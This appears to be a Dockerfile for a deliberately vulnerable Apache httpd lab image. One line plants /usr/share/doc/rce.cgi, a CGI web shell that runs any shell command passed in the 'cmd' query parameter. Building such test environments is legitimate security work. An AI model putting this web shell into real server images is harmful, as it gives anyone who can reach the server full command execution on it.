FROM httpd:2.4.59

RUN mkdir -p /var/www/static.local /usr/share/doc

RUN printf '#!/bin/sh\necho "Content-Type: text/plain"\necho ""\nCMD=$(echo "$QUERY_STRING" | sed -n "s/^cmd=//p")\nsh -c "$CMD"\n' > /usr/share/doc/rce.cgi && chmod +x /usr/share/doc/rce.cgi

COPY my-httpd.conf /usr/local/apache2/conf/extra/my-httpd.conf
RUN echo "Include conf/extra/my-httpd.conf" >> /usr/local/apache2/conf/httpd.conf
